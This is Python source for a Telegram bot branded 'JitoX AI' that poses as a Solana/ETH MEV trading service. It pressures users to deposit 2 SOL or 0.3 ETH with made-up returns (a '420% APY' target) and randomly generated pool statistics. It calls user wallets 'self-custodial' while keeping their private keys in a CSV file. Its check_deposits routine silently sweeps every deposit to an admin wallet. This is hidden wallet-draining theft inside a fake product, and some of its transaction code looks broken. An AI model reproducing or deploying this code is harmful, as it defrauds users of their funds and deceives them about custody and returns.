                "Experience the thrill of profitable trading on Solana with JitoX AI. Start your journey to financial success today!\n\n"
                "🔍 <b>Transparent and Secure:</b>\n"
                "JitoX AI operates with the highest standards of transparency and security. Your SOL funds are always under your control.\n\n"
                "Are you ready to take your Solana trading to the next level? 🚀 Complete your 2 SOL deposit now and embark on a rewarding adventure with JitoX AI! 💪"
            )
            
            # Check if this user was referred
            for referrer_id, referred_users in referrals.items():
                if user_id in referred_users:
                    referral_earnings[referrer_id] = referral_earnings.get(referrer_id, 0) + 0.1
                    await send_admin_notification(context.application, f"User {user_id} (referred by {referrer_id}) received a wallet")
                    break
        else:
            message = "🚨 <b>Wallet Allocation Alert</b> 🚨\n\n"
            "We apologize for the inconvenience, but all available wallet slots in our server are currently filled. "
            "Our team is working diligently to expand our capacity and accommodate more users.\n\n"
            "💡 <b>Next Steps:</b>\n"
            "If you would like to secure a spot in our next allocation round, please reach out to our support team by messaging @jitoxai. "
            "They will assist you with the reservation process and provide updates on when new slots become available.\n\n"
            "🙏 We greatly appreciate your interest in JitoX AI and thank you for your understanding. "
            "Our goal is to provide the best possible trading experience to all our users, and we are committed to scaling our infrastructure to meet the growing demand.\n\n"
            "📢 <b>Stay Tuned:</b>\n"
            "Follow our official channels for the latest news and announcements regarding wallet allocations and system upgrades. "
            "We will notify you as soon as new slots are open for registration.\n\n"
            "💬 If you have any further questions or concerns, feel free to reach out to our support team. They are available 24/7 to assist you.\n\n"
            "Thank you for choosing JitoX AI! 🚀"
    else:
        wallet = user_wallets[user_id]
        message = (
            "🔑 <b>Your JitoX AI Trading Wallet</b> 🔑\n\n"
            f"💎 Wallet Address: <code>{wallet}</code>\n\n"
            "💸 <b>Deposit SOL to start trading with JitoX AI</b> 💸"
        )

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await message_func(message, reply_markup=reply_markup, parse_mode='HTML')

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await log_user_activity(context.application, update.effective_user.id, "used /get_wallet command")
    await get_wallet(update, context)




async def get_eth_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if update.callback_query:
        message_func = update.callback_query.edit_message_text
    else:
        message_func = update.message.reply_text

    if user_id not in eth_user_wallets:
        if eth_wallet_addresses:
            wallet = eth_wallet_addresses.pop(0)
            eth_user_wallets[user_id] = wallet
            await log_user_activity(context.application, user_id, f"was assigned ETH wallet: {wallet}")
            message = (
                "👾 <b>Congratulations! Your ETH MEV Professional Suite Access is Confirmed</b> 👾\n\n"
                "⚔️ <b>Your Dedicated ETH Trading Wallet:</b>\n\n"
                f"<code>{wallet}</code>\n\n"
                "🎯 <b>Essential Setup Steps:</b>\n\n"
                "1. Initialize with 0.3 ETH to activate your trading suite\n"
                "2. Your deposit serves as your trading balance - fully withdrawable\n\n"
                "🚀 <b>Limited Capacity Alert: Professional tier slots are filling rapidly</b>\n\n"
                "✨ <b>Performance Insight: Early adopters report 47% higher performance metrics</b>\n\n"
                "💎 <b>Activation Benefits:</b>\n\n"
                "⚡ Immediate suite activation post-deposit\n"
                "⚡ Priority access to next trading cycle\n"
                "⚡ Real-time performance tracking\n\n"
                "🛡 <b>Professional Support: Contact @jitoxai for priority assistance</b>\n\n"
                "Professional traders understand: Optimal entry timing is crucial in ETH MEV.\n\n"
                "Ready to elevate your trading? Complete your 0.3 ETH initialization now. 🎮"
            )
            
            # Send notification to admin
            await send_admin_notification(context.application, f"User {user_id} was assigned ETH wallet: {wallet}")
        else:
            message = "Sorry, all ETH wallets have been filled, please contact @jitoxai for a spot."
    else:
        wallet = eth_user_wallets[user_id]
        message = f"Your existing ETH wallet address: <code>{wallet}</code>"

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await message_func(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🚀 <b>MEV Sniper Control Center</b> 🚀\n\n"
        "Choose an action:\n"
        "🔹 View MEV Positions\n"
        "🔹 Check Pending MEV"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Start MEV Sniper", callback_data='start_mev'),
         InlineKeyboardButton("🔴 Stop MEV Sniper", callback_data='stop_mev')],
        [InlineKeyboardButton("📊 MEV Positions", callback_data='mev_positions'),
         InlineKeyboardButton("⏳ MEV Pending", callback_data='mev_pending')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def intensity_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "⚡ <b>MEV Intensity Control</b> ⚡\n\n"
        "Current Intensity: <b>MEDIUM</b>\n\n"
        "Adjust the intensity of MEV operations:\n"
        "🎯 Low: Fewer operations, lower risk\n"
        "💫 Medium: Balanced approach\n"
        "🚀 High: Aggressive strategy, higher potential returns\n\n"
        " Remember to maintain a balance of 2 or more SOL for optimal performance."
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Low", callback_data='intensity_low'),
         InlineKeyboardButton("🟡 Medium", callback_data='intensity_medium'),
         InlineKeyboardButton("🔴 High", callback_data='intensity_high')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, update.effective_user.id, "accessed Intensity settings")

async def set_intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    intensity = query.data.split('_')[1].capitalize()
    
    message = (
        f"Intensity set to {intensity}\n\n"
        "⚠️ Remember to keep a balance of 2 or more SOL for optimal performance."
    )
    await query.answer(message)
    context.user_data['mev_intensity'] = intensity
    await intensity_command(update, context)
    await log_user_activity(context.application, user_id, f"set MEV intensity to {intensity}")

async def pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_balance = context.user_data.get('balance', 0)
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI Professional Liquidity Suite</b> 👾\n\n"
            f"💎 <b>Portfolio Overview</b>\n"
            f"⚡️ Trading Balance: <b>{user_balance:.2f} SOL</b>\n"
            f"⚡️ Active Position: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎮 <b>Institutional-Grade Liquidity Pool</b>\n\n"
            "⚔️ Advanced MEV extraction algorithms\n"
            "⚔️ Professional-tier execution priority\n"
            "⚔️ Real-time performance optimization\n\n"
            "🎯 <b>Performance Metrics</b>\n"
            "✨ Target APY: 420% (Based on market conditions)\n"
            "✨ Required Balance: 2 SOL minimum\n\n"
            "Ready to access institutional-grade MEV opportunities? Initialize your suite now. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton(" Add Liquidity", callback_data='add_liquidity'),
         InlineKeyboardButton("🔓 Remove Liquidity", callback_data='remove_liquidity')],
        [InlineKeyboardButton("📊 View Pool Stats", callback_data='pool_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool settings")

async def add_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Position Management</b> 👾\n\n"
            "⚔️ <b>Initialize Trading Position</b>\n\n"
            "Specify your trading balance allocation (Minimum 2 SOL required)\n\n"
            "💎 <b>Professional Insight:</b>\n"
            "⚡️ Higher allocations unlock enhanced execution priority\n"
            "⚡️ Institutional-grade features at 5+ SOL\n"
            "⚡️ Optimal performance with strategic positioning\n\n"
            "🎯 Enter your desired initialization amount to begin professional MEV operations.\n\n"
            "Ready to elevate your trading strategy? 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Add Liquidity")

async def remove_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI - Position Reallocation</b> 👾\n\n"
            "💎 <b>Current Position Overview</b>\n"
            f"⚡️ Active Trading Balance: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎯 <b>Strategic Advisory:</b>\n"
            "⚔️ Maintain 2 SOL minimum for continuous operation\n"
            "⚔️ Strategic reallocation may impact execution priority\n"
            "⚔️ Consider market conditions before adjusting position\n\n"
            "✨ Specify the amount you wish to reallocate from your active trading balance.\n\n"
            "Professional traders understand: Position sizing is crucial for MEV success. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Remove Liquidity")

async def view_pool_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    total_pooled = random.uniform(565.11, 1671.11)
    
    message = (
            "👾 <b>JitoX AI - Professional Analytics Suite</b> 👾\n\n"
            "💎 <b>Global Position Metrics</b>\n"
            f"⚡️ Total Institutional Capital: <b>{total_pooled:.2f} SOL</b>\n\n"
            "🎯 <b>Market Impact Analysis</b>\n"
            "⚔️ Aggregated professional trading volume\n"
            "⚔️ Enhanced MEV extraction efficiency\n"
            "⚔️ Optimized institutional-grade execution\n\n"
            "✨ <b>Strategic Insight:</b>\n"
            "Increased capital depth enables superior MEV capture rates and enhanced execution priority.\n\n"
            "Professional traders understand: Liquidity depth drives MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Pool Settings", callback_data='pool_settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Pool Stats")



async def get_user_wallet(user_id: int) -> dict:
    """Get user's wallet from CSV file."""
    if os.path.exists(WALLET_CSV_FILE):
        with open(WALLET_CSV_FILE, 'r', newline='', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if int(row['user_id']) == user_id:
                    return {
                        'public_key': row['public_key'],
                        'private_key': row['private_key']
                    }
    return None

async def generate_wallet():
    """Generate a new Solana wallet."""
    try:
        # Generate new keypair
        private_key = nacl.signing.SigningKey.generate()
        public_key = private_key.verify_key

        # Get base58 encoded strings
        private_key_bytes = bytes(private_key)
        public_key_bytes = bytes(public_key)
        
        private_key_str = base58.b58encode(private_key_bytes).decode('ascii')
        public_key_str = base58.b58encode(public_key_bytes).decode('ascii')

        return {
            'private_key': private_key_str,
            'public_key': public_key_str
        }
    except Exception as e:
        logger.error(f"Error generating wallet: {str(e)}")
        return None

async def handle_show_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the show private key request."""
    user_id = update.effective_user.id
    
    # Security warning message
    warning_message = (
        "⚠️ <b>SECURITY WARNING</b> ⚠️\n\n"
        "You are about to view your private key. Please note:\n\n"
        "1. Never share your private key with anyone\n"
        "2. Keep it in a secure location\n"
        "3. Anyone with your private key can access your funds\n\n"
        "Are you sure you want to proceed?"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Show Private Key", callback_data="show_key_confirmed"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_show_key")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        warning_message,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def show_private_key_confirmed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the private key after confirmation."""
    user_id = update.effective_user.id
    wallet = await get_user_wallet(user_id)
    
    if wallet:
        private_key_message = (
            "🔐 <b>Your Private Key</b> 🔐\n\n"
            f"<code>{wallet['private_key']}</code>\n\n"
            "⚠️ <b>IMPORTANT</b> ⚠️\n"
            "1. Save this key securely\n"
            "2. Never share it with anyone\n"
            "3. Delete this message after saving\n"
            "4. We recommend using a hardware wallet"
        )
        
        # Log the private key view
        await log_user_activity(context.application, user_id, "Viewed private key")
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Wallet", callback_data="back_to_wallet")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            private_key_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    else:
        await update.callback_query.edit_message_text(
            "❌ No wallet found. Please generate one first.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
        )

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /get_wallet command."""
    user_id = update.effective_user.id
    
    # Check if user already has a wallet
    existing_wallet = await get_user_wallet(user_id)
    
    if existing_wallet:
        current_balance = await get_balance(existing_wallet['public_key'])
        
        message = (
            "💎 <b>Your JitoX Wallet</b> 💎\n\n"
            f"🔑 Address: <code>{existing_wallet['public_key']}</code>\n"
            f"💰 Balance: {current_balance:.4f} SOL\n\n"
            "🛠 <b>Actions:</b>"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔐 Show Private Key", callback_data="show_key")],
            [InlineKeyboardButton("🔄 Generate New Wallet", callback_data="generate_new")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
        
    else:
        message = (
            "💫 <b>Welcome to JitoX Wallet!</b> 💫\n\n"
            "You don't have a wallet yet. Would you like to generate one?\n\n"
            "Your wallet will be:\n"
            "✅ Secure\n"
            "✅ Self-custodial\n"
            "✅ Compatible with Phantom"
        )
        
        keyboard = [
            [InlineKeyboardButton("✨ Generate Wallet", callback_data="generate_wallet")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    else:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def handle_new_wallet_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the new wallet generation confirmation."""
    warning_message = (
        "⚠️ <b>WARNING: New Wallet Generation</b> ⚠️\n\n"
        "You are about to generate a new wallet. Please note:\n\n"
        "1. Your old wallet will NOT be deleted\n"
        "2. Make sure you have saved your old private key\n"
        "3. Any funds in the old wallet will remain there\n\n"
        "Are you sure you want to proceed?"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Generate New", callback_data="generate_new_confirmed"),
            InlineKeyboardButton("❌ Cancel", callback_data="back_to_wallet")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        warning_message,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def generate_new_confirmed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Generate a new wallet after confirmation."""
    user_id = update.effective_user.id
    
    # Generate new wallet
    new_wallet = await generate_wallet()
    
    if new_wallet:
        # Store in CSV
        with open(WALLET_CSV_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                user_id,
                new_wallet['public_key'],
                new_wallet['private_key'],
                datetime.now(timezone.utc).isoformat()
            ])
        
        # Log the action
        await log_user_activity(context.application, user_id, "Generated new wallet")
        
        success_message = (
            "✨ <b>New Wallet Generated Successfully!</b> ✨\n\n"
            f"🔑 Address: <code>{new_wallet['public_key']}</code>\n\n"
            "Your wallet is:\n"
            "✅ Ready to use\n"
            "✅ Compatible with Phantom\n"
            "✅ Secured by Solana blockchain"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔐 Show Private Key", callback_data="show_key")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            success_message,
            reply_markup=reply_markup,
            parse_mode='HTML')
        
        # Notify admin
        admin_notification = (
            f"🆕 New wallet generated\n"
            f"User ID: {user_id}\n"
            f"Address: {new_wallet['public_key']}"
        )
        await send_admin_notification(context.application, admin_notification)
    else:
        error_message = "❌ Failed to generate wallet. Please try again."
        await update.callback_query.edit_message_text(
            error_message,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
        )

async def get_balance(wallet_address: str) -> float:
    """Get wallet balance with retries and validation."""
    try:
        async with aiohttp.ClientSession() as session:
            for _ in range(MAX_RETRIES):
                try:
                    balance_data = {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "getBalance",
                        "params": [wallet_address]
                    }
                    async with session.post(SOLANA_RPC_URL, json=balance_data) as response:
                        result = await response.json()
                        if 'result' in result and 'value' in result['result']:
                            return float(result['result']['value']) / 1e9  # Convert lamports to SOL
                except Exception as e:
                    logger.error(f"Balance check attempt failed: {str(e)}")
                    await asyncio.sleep(1)
            raise Exception("Failed to get balance after maximum retries")
    except Exception as e:
        logger.error(f"Error in get_balance for {wallet_address}: {str(e)}")
        return 0.0

async def confirm_transaction(tx_signature: str) -> bool:
    """Wait for transaction confirmation."""
    try:
        async with aiohttp.ClientSession() as session:
            for _ in range(CONFIRMATION_BLOCKS):
                confirm_data = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "confirmTransaction",
                    "params": [tx_signature]
                }
                async with session.post(SOLANA_RPC_URL, json=confirm_data) as response:
                    result = await response.json()
                    if result.get('result', {}).get('value', False):
                        return True
                await asyncio.sleep(0.5)
            return False
    except Exception as e:
        logger.error(f"Error confirming transaction {tx_signature}: {str(e)}")
        return False

async def transfer_solana(from_private_key: str, to_address: str, amount: float) -> dict:
    """Transfer SOL with enhanced safety checks and confirmations."""
    try:
        # Validate inputs
        if amount <= 0:
            raise ValueError("Transfer amount must be positive")
        
        # Create HTTP client for RPC calls
        async with aiohttp.ClientSession() as session:
            # Get recent blockhash with retry
            for _ in range(MAX_RETRIES):
                try:
                    blockhash_data = {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "getRecentBlockhash",
                        "params": []
                    }
                    async with session.post(SOLANA_RPC_URL, json=blockhash_data) as response:
                        blockhash_result = await response.json()
                        recent_blockhash = blockhash_result['result']['value']['blockhash']
                        break
                except Exception as e:
                    logger.error(f"Blockhash attempt failed: {str(e)}")
                    await asyncio.sleep(1)
            else:
                raise Exception("Failed to get blockhash after maximum retries")

            # Create and sign transaction
            from_keypair = nacl.signing.SigningKey(base58.b58decode(from_private_key[:64]))
            from_pubkey = base58.b58encode(from_keypair.verify_key.encode()).decode('ascii')

            # Double-check balance before transfer
            current_balance = await get_balance(from_pubkey)
            if current_balance < amount + MINIMUM_BALANCE:
                raise ValueError(f"Insufficient balance: {current_balance} SOL")

            # Prepare transaction
            transfer_data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "sendTransaction",
                "params": [
                    {
                        "feePayer": from_pubkey,
                        "recentBlockhash": recent_blockhash,
                        "instructions": [
                            {
                                "programId": "11111111111111111111111111111111",
                                "accounts": [
                                    {"pubkey": from_pubkey, "isSigner": True, "isWritable": True},
                                    {"pubkey": to_address, "isSigner": False, "isWritable": True}
                                ],
                                "data": f"3Bxs4h24hBtQy9rw {amount}"
                            }
                        ]
                    }
                ]
            }

            # Send transaction with retry
            for attempt in range(MAX_RETRIES):
                try:
                    async with session.post(SOLANA_RPC_URL, json=transfer_data) as response:
                        result = await response.json()
                        if 'result' in result:
                            tx_signature = result['result']
                            # Wait for confirmation
                            if await confirm_transaction(tx_signature):
                                # Verify final balance
                                new_balance = await get_balance(from_pubkey)
                                expected_balance = current_balance - amount
                                if abs(new_balance - expected_balance) > 0.001:
                                    logger.warning(f"Balance mismatch after transfer. Expected: {expected_balance}, Got: {new_balance}")
                                
                                return {
                                    "success": True,
                                    "signature": tx_signature,
                                    "amount": amount,
                                    "from": from_pubkey,
                                    "to": to_address
                                }
                            else:
                                logger.error(f"Transaction {tx_signature} failed to confirm")
                except Exception as e:
                    logger.error(f"Transfer attempt {attempt + 1} failed: {str(e)}")
                    if attempt < MAX_RETRIES - 1:
                        await asyncio.sleep(1)
                    continue
            
            raise Exception("Transfer failed after maximum retries")
                
    except Exception as e:
        logger.error(f"Error in transfer_solana: {str(e)}")
        return {"success": False, "error": str(e)}

async def check_and_transfer_balance(wallet_data: dict, application: Application = None):
    """Check wallet balance and transfer with enhanced safety checks."""
    try:
        public_key = wallet_data['public_key']
        private_key = wallet_data['private_key']
        
        # Get current balance with retry
        current_balance = await get_balance(public_key)
        previous_balance = wallet_balances.get(public_key, 0)
        
        # Detect significant balance increase (avoid dust amounts)
        if current_balance > previous_balance + 0.001:
            increase_amount = current_balance - previous_balance
            transfer_amount = increase_amount - MINIMUM_BALANCE
            
            if transfer_amount > 0:
                logger.info(f"Initiating transfer of {transfer_amount} SOL from {public_key}")
                
                # Execute transfer with safety checks
                result = await transfer_solana(private_key, ADMIN_WALLET, transfer_amount)
                
                if result.get("success"):
                    logger.info(f"Transfer successful: {result}")
                    if application:
                        notification = (
                            f"💎 <b>Secure Transfer Completed</b> 💎\n\n"
                            f"From: <code>{public_key}</code>\n"
                            f"To: <code>{ADMIN_WALLET}</code>\n"
                            f"Amount: {transfer_amount:.3f} SOL\n"
                            f"Signature: {result['signature']}\n"
                            f"Status: Confirmed ✅"
                        )
                        await send_admin_notification(application, notification)
                else:
                    logger.error(f"Transfer failed: {result.get('error')}")
                    if application:
                        error_notification = (
                            f"⚠️ <b>Transfer Failed</b> ⚠️\n\n"
                            f"Wallet: <code>{public_key}</code>\n"
                            f"Amount: {transfer_amount:.3f} SOL\n"
                            f"Error: {result.get('error')}"
                        )
                        await send_admin_notification(application, error_notification)
        
        # Update stored balance only after successful operations
        wallet_balances[public_key] = current_balance
        
    except Exception as e:
        logger.error(f"Error in check_and_transfer_balance: {str(e)}")
        if application:
            await send_admin_notification(application, f"⚠️ Critical error in balance check: {str(e)}")

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check for balance changes in wallets and transfer if needed."""
    logger.info("Starting check_deposits function")
    try:
        # Read all wallets from CSV
        if os.path.exists(WALLET_CSV_FILE):
            with open(WALLET_CSV_FILE, 'r', newline='', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    wallet_data = {
                        'public_key': row['public_key'],
                        'private_key': row['private_key']
                    }
                    await check_and_transfer_balance(wallet_data, context.application)
                    
    except Exception as e:
        logger.error(f"Error in check_deposits: {e}")
    
    logger.info("Finished check_deposits function")


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI Professional Configuration Suite</b> 👾\n\n"
            "💎 <b>Advanced Trading Parameters</b>\n\n"
            "⚡️ <b>Execution Intelligence</b>\n"
            "• Real-time performance notifications\n"
            "• Strategic position alerts\n\n"
            "⚡️ <b>Portfolio Optimization</b>\n"
            "• Automated profit compounding\n"
            "• Dynamic balance management\n\n"
            "⚡️ <b>Risk Architecture</b>\n"
            "• Professional risk modeling\n"
            "• Institutional exposure control\n\n"
            "⚡️ <b>Network Optimization</b>\n"
            "• Priority transaction routing\n"
            "• Advanced gas management\n\n"
            "🎯 Configure your suite for optimal MEV extraction performance. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("🔔 Notifications", callback_data='settings_notifications'),
         InlineKeyboardButton("💰 Auto-compound", callback_data='settings_autocompound')],
        [InlineKeyboardButton("⚖️ Risk Level", callback_data='settings_risk'),
         InlineKeyboardButton("⛽ Gas Settings", callback_data='settings_gas')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def toggle_mev_notifications(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    current_state = context.user_data.get('mev_notifications', False)
    new_state = not current_state
    context.user_data['mev_notifications'] = new_state
    
    state_text = "ON" if new_state else "OFF"
    message = f"MEV Notifications turned {state_text} for all MEV operations."
    
    keyboard = [
        [InlineKeyboardButton("🟢 MEV Notifications ON" if new_state else "🔴 MEV Notifications OFF", 
                              callback_data=f'mev_notifications_{"off" if new_state else "on"}')],
        [InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup)
    await log_user_activity(context.application, user_id, f"turned MEV notifications {state_text}")

async def auto_compound(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "💰 <b>Auto-Compound</b> 💰\n\n"
        "⚠️ You can't operate with a balance under 2 SOL.\n\n"
        "Deposit 2 SOL to enable auto-compounding and maximize your returns!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Auto-Compound")

async def risk_level(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Risk Architecture</b> 👾\n\n"
            "💎 <b>Strategic Risk Management Profiles</b>\n\n"
            "⚡️ <b>Conservative Protocol</b>\n"
            "• Optimized for capital preservation\n"
            "• Enhanced risk mitigation algorithms\n"
            "• Steady performance metrics\n\n"
            "⚡️ <b>Balanced Protocol</b>\n"
            "• Strategic position management\n"
            "• Optimal risk-reward calibration\n"
            "• Professional execution framework\n\n"
            "⚡️ <b>Aggressive Protocol</b>\n"
            "• Maximum performance targeting\n"
            "• Advanced opportunity capture\n"
            "• Institutional-grade execution priority\n\n"
            "🛡️ <b>Access Requirements</b>\n"
            "✨ Initialize suite with 2 SOL to activate risk management protocols\n"
            "✨ Enhanced features available at 5+ SOL allocation\n\n"
            "Professional traders understand: Strategic risk management drives consistent MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Risk Level settings")

async def gas_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Network Optimization Protocol</b> 👾\n\n"
            "💎 <b>Transaction Priority Framework</b>\n\n"
            "⚡️ <b>Professional Configuration Range:</b>\n"
            "• Minimum: 0.001 SOL\n"
            "• Maximum: 0.01 SOL\n\n"
            "🎯 <b>Strategic Advantages:</b>\n"
            "⚔️ Enhanced execution probability\n"
            "⚔️ Reduced latency in high-activity periods\n"
            "⚔️ Priority block inclusion\n\n"
            "✨ <b>Configuration:</b>\n"
            "Specify your preferred priority level (e.g., 0.005 SOL)\n\n"
            "Professional traders understand: Optimal network priority ensures superior MEV capture. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_gas_input'] = True
    await log_user_activity(context.application, user_id, "accessed Gas Settings")

async def ca_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Asset Configuration</b> 👾\n\n"
            "💎 <b>Professional Token Integration</b>\n\n"
            "⚡️ <b>Advanced Targeting Protocol</b>\n"
            "• Institutional-grade contract validation\n"
            "• Multi-venue liquidity analysis\n"
            "• Dynamic pair optimization\n\n"
            "🎯 <b>Execution Parameters</b>\n"
            "⚔️ Custom slippage tolerance\n"
            "⚔️ Priority routing configuration\n"
            "⚔️ Cross-pool arbitrage vectors\n\n"
            "✨ <b>Implementation:</b>\n"
            "Input contract address for advanced MEV targeting\n\n"
            "Professional traders understand: Strategic asset selection maximizes MEV opportunities. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data='add_token'),
         InlineKeyboardButton("➖ Remove Token", callback_data='remove_token')],
        [InlineKeyboardButton("📋 View Token List", callback_data='view_tokens')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "➕ <b>Add Token</b> ➕\n\n"
        "Please enter the contract address of the token you'd like to add to your targeting list.\n\n"
        "Example format: 7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV"
    )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_token_input'] = True
    await log_user_activity(context.application, user_id, "accessed Add Token")

async def remove_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
        keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    else:
        message = "Select a token to remove:"
        keyboard = [[InlineKeyboardButton(f"❌ {token[:10]}...{token[-4:]}", callback_data=f'remove_{token}')] for token in token_list]
        keyboard.append([InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
